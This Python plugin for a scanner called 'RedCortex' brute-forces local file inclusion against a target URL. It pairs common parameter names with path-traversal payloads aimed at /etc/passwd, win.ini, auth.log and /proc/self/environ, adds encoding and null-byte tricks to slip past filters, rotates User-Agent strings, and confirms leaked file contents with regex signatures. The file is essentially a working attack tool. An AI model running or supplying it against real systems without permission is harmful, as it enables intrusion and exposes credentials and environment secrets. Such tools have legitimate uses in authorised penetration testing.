"""
RedCortex Plugin: Advanced LFI Detection

Brute param coverage, multiple payloads, encoding/tamper techniques, proof by file leak and content signatures.
"""

import requests, random, re

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64;)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2)",
    "Mozilla/5.0 (Android 10; SM-G973F)"
]

LFI_PARAMS = [
    "file", "page", "path", "doc", "template", "include", "download", "dir", "folder", "log",
    "img", "avatar", "action", "style", "news", "id"
]

LFI_PAYLOADS = [
    "../../etc/passwd",
    "../etc/passwd",
    "../../../../etc/passwd",
    "/etc/passwd",
    "..\\..\\windows\\win.ini",
    "C:\\windows\\win.ini",
    "../../boot.ini",
    "../../var/log/auth.log",
    "....//....//....//etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/proc/self/environ"
]
TAMPERS = [
    lambda x: x,
    lambda x: x.replace("/", "\\"),
    lambda x: x.replace("../", "..%2f"),
    lambda x: x.replace("/", "%2f"),
    lambda x: x.replace("etc", "e%74c"),
    lambda x: x.replace("..", ".../"),
    lambda x: x + "%00",
    lambda x: x + "\x00",
]

# Evidence patterns for LFI confirmation
LFI_PATTERNS = [
    r"root:.*:0:0:",                 # /etc/passwd
    r"\[extensions\]",               # win.ini
    r"root:x:0:0:",                  # /etc/passwd variant
    r"boot loader",                  # boot.ini or lnx ini
    r"auth.*log",                    # auth.log
    r"userinit=",                    # boot.ini
    r"mime\.types",                  # apache
    r"ENV=.*PATH=",                  # environ
]

def send_req(url, params):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        resp = requests.get(url, params=params, headers=headers, timeout=10)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

def run(response, url):
    """RedCortex plugin interface; brute LFI param/payload/tamper and check for file evidence."""
    findings = []
    params = {}

    try:
        for param_name in LFI_PARAMS:
            for tamper in TAMPERS:
                for payload in LFI_PAYLOADS:
                    try:
                        fuzzed = tamper(payload)
                        params[param_name] = fuzzed
                        print(f"[*] Testing LFI on param '{param_name}' with tamper '{tamper.__name__ if hasattr(tamper,'__name__') else str(tamper)}' and payload '{payload}'")
                        sc, body = send_req(url, params)
                        # Check for file evidence in response
                        if sc == 200:
                            for pattern in LFI_PATTERNS:
                                if re.search(pattern, body, re.IGNORECASE):
                                    findings.append({
                                        "type": "LFI",
                                        "description": f"LFI detected via {param_name}, payload '{fuzzed}', evidence '{pattern}'",
                                        "param": param_name,
                                        "payload": fuzzed,
                                        "original_payload": payload,
                                        "tamper": tamper.__name__ if hasattr(tamper, "__name__") else str(tamper),
                                        "severity": "high",
                                        "url": url,
                                        "evidence": re.findall(pattern, body, re.IGNORECASE)
                                    })
                                    return findings
                            # Also detect raw filename echo (less strict)
                            if "root:" in body or "extensions" in body or "userinit=" in body:
                                findings.append({
                                    "type": "LFI",
                                    "description": f"Possible LFI leak via {param_name} ({tamper})",
                                    "param": param_name,
                                    "payload": fuzzed,
                                    "original_payload": payload,
                                    "tamper": tamper.__name__ if hasattr(tamper, "__name__") else str(tamper),
                                    "severity": "medium",
                                    "url": url,
                                    "evidence": fuzzed
                                })
                                return findings
                    except KeyboardInterrupt:
                        print("[!] Scan interrupted by user.")
                        return findings
    except KeyboardInterrupt:
        print("[!] Scan interrupted by user.")
        return findings

    return findings
